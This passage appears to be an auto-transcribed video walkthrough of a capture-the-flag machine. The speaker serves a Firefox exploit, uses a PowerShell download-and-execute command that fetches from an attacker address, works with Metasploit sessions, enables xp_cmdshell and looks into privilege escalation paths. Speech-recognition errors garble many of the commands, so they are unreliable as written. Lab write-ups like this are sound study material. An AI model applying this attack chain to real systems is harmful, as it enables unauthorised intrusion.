here and see what happens if I do at a there we go I got 11 lines left I think we did too much 1 2 3 4 5 6 7 8 9 10 10 lines left so 10 at a like magic and let's document this powershell YX IWR 10 10 10 14 2 and we'll see if this works so we can copy this into we have to FTP no we don't the server should be hitting us constantly yep so we can copy that into dub-dub-dub FF exploit dot is it HTML I did yep and then wait for it to hit us and we can get out of that she'll jobs we're still listening here it is so we hit / FF exploit and found out found so I type it somewhere but the easiest way to fix that to copy and paste FF expl that's weird oh crap I'm not in the right directory there we go now this should work and this is going to take a few minutes so I'm just going to pause the video and we'll resume it once it hits okay we have it hitting and it's making requests back to us probably doing some type of heap spray if we look at Metasploit we don't have anything go back to place on and hopefully this hap hits before the scheduled task kills it if it doesn't then we'll have to probably hop on the box and fix it so we can get this again it's doing some type of spray to try to get to the shellcode what if I can move Metasploit into three so let's see control s3 there we go and I think it killed so let's see sessions Josh I zero let's cheat a little bit sessions - i won two three okay we have to get a shell again that's still enabled it's not enabled advanced you configure XP CMD no Matt reconfigure go an XP CMD shell I already had typed it is okay we should be getting a shell as a user maybe there we go because we see it was doing that continue and then all of a sudden it went to Firefox not HTML because the schedule task it has killed it so I think there's another exploit that would work for this but it's not as easy to modify let's see shell actually I don't want shell CD users users Sarah CD desktop Oh a download browser dot fat and this is probably an unicorn okay and then let's make this I don't know 300 or 500 it's going to paint ourselves 500 times from 80 so we increased the time between Firefox's by we're do 10 what do you 800 then let's see if we can just upload it upload browser dot bat access is denied crap I guess we have to get it admin on the box to do this because we don't have right we only have read which is annoying so let's see we can do PS explorer 1 if we could just kill that scheduled task this ping there's Firefox it's probably this if we kill this will it work can we kill it could have been this one but I would think it would be an interactive one and that's the interactive CMD so PS we don't have ping running and PowerShell is still running let me have powershell firefox is running so i think we killed the right one see which window so we can background this and if we do sessions we didn't get a session but we will see if we ever get a session when that exploit finishes if we did it correctly so i'm gonna pause the video because this could take some time and then we'll come back and see if we get a session and when we get a session we'll check if we have the SE impersonate token which i don't think we will so hopefully this works if not then at least we did one user in three different prea vests so yeah it took like 10 different tries but I finally got a matter procession back so would not recommend using this exploit but let's just see what privileges we have so so okay am i slash proof and we have just the privileges of a standard user so don't have that se impersonation privilege so in order to escalate we would have had to abuse the sharepoint thing or the sharepoint powershell script or that ms whatever it was cv 2017 zero to one three we couldn't use rotten potato b we don't have the privilege we only get that privilege when we execute as a service so that will conclude the Box hope you guys enjoyed it take care and I'll see you next week or not next week on Saturday when the Machine CrimeStoppers retires so take care later